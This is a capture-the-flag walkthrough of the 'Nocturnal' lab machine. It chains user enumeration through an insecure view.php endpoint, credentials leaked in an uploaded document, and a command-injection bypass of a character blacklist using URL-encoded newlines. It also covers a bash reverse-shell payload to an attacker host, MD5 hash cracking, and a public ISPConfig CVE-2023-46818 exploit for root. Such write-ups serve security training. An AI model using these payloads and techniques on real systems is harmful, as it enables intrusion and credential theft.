# Nocturnal

Difficulty: Easy
OS: Linux
Category: Offensive
Date: 2026-02-24T05:14:03.639Z

![f6a56cec6e9826b4ed124fb4155abc66.webp](f6a56cec6e9826b4ed124fb4155abc66.webp)

### Reconnaissance

I scan with `nmap -sCV [target] -oN nocturnal-scans` and find two open ports.

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I visit the port 80 it’s **nocturnal.htb**. I add the domain to `/etc/hosts`

![image.png](image.webp)

I register a user, I'll only see a page to uploading a file

I tried uploading a pdf file since it accepts it

If I click the uploaded file it has an endpoint `nocturnal.htb/view.php?username=kali&file=file.pdf` . This means that if I purposely make the *username* wrong or the *file* wrong it will output `User not found` or `File not found`.

This also accepts **odt** files, odt is a zip file

### Enumeration

This means I can enumerate the users

```python
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=1.pdf' -w /usr/share/wordlists/fuzzDicts/userNameDict/user.txt -H 'Cookie: [Cookie]' -mc 200 -fs 2985
```

If I look at my BurpSuite I can see the Content-Length is 2985 at that endpoint above.

This will reveal the following names

```python
admin
test
amanda
tobias
```

I access the user Amanda with `http://nocturnal.htb/view.php?username=amanda&file=1.pdf` . Then, I get the *privacy.odt* file

I unzip the *odt* file then look at `content.xml` I'll see the password inside

![image.png](image%201.webp)

I log in as *amanda* on the website, and go to Admin Panel

![image.png](image%202.webp)

I look at `admin.php` it allows a user to execute command

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";

<SNIP>

$process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }
```

The vulnerable parameter would be `$password` as per my understanding.

The `$command` will zip the files recursively and name the zipped file based on the current date and time in `$backupFile` . Since `$command` is running in the shell, anything that a user inputs in the `$password` will be executed. However, `$password` has a function…

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```

Meaning it will blacklist the following characters but not the `%` character. Then a user can put `%0a` a url encoded new line character and any other url encoded character.

I test the following payload in the backup password field:

![image.png](image%203.webp)

```php
0Abash%09-i%09%3E%26%09/dev/tcp/TARGET/PORT%090%3E%261
```

This will create a bounce shell

This will create a shell and improve my shell with `python3 -c 'import pty;pty.spawn("/bin/bash")'`

I download the database `nocturnal_database.db`

By my own choice I simply extracted the full content of the database, it has base64 texts and found this part using cyberchef. I paste it into cyberchef then chose `From Base64` and found the following

![image.png](image%204.webp)

Then I use a hash identifier or `hashid` it is an `md5` hash. I crack it using *john the ripper* or *hashcat*. I use *john*

```php
john --format=raw-md5 --wordlist=/path/to/rockyou.txt hash.txt 
```

`tobias:slowmotionapocalypse`

I connect with `ssh tobias@nocturnal.htb` and read the user flag.

### Foothold

As `tobias`, I run `netstat -tuln` and find a service listening at `127.0.0.1:8080`.

In order for me to view this I need to SSH with the following to forward in my machine

```php
ssh -L 8888:127.0.0.1:8080 tobias@nocturnal.htb
```

Then I open this to my browser `127.0.0.1:8888` I'll see an ispconfig login panel

I use the following creds `admin:slowmotionapocalypse` I can attempt to crack the hash from admin if I want using the **john** command above.

The following exploit for me to use to gaining a root is https://github.com/ajdumanhug/CVE-2023-46818

> This is a python version of the original php script for the vulnerability affecting ispconfig 3.2.11 and previous versions.
>

I execute the following command

```python
python3 exploit.py http://127.0.0.1:8888 admin slowmotionapocalypse
```

Then I get the *root* **FLAG**

![image.png](image%205.webp)

![image.png](image%206.webp)
